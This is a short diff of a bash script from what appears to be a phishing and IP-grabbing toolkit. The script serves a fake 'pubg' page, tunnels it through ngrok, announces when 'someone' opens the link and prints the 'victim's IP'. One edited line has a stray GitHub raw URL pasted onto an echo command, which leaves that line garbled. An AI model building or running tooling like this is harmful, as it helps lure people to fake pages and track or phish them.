@@ -57,7 +57,7 @@ cd .sites/pubg/notp
 bash local.sh
 
 ngrok
-cd /storage/emulated/0/sukhdevr898/Project/loction/.sites/pubg/notp
+cd joker/.sites/pubg/notp
 while true;
 
 do
@@ -103,7 +103,7 @@ echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━�
 
 echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃"
 echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
-echo -e "\n"
+echo -e "\n"https://raw.githubusercontent.com/sukhdevr898/joker/main/update1.0
 echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
 echo -e "\e[94m\n┃-------  $IP  -------┃"
 echo -e "\n"
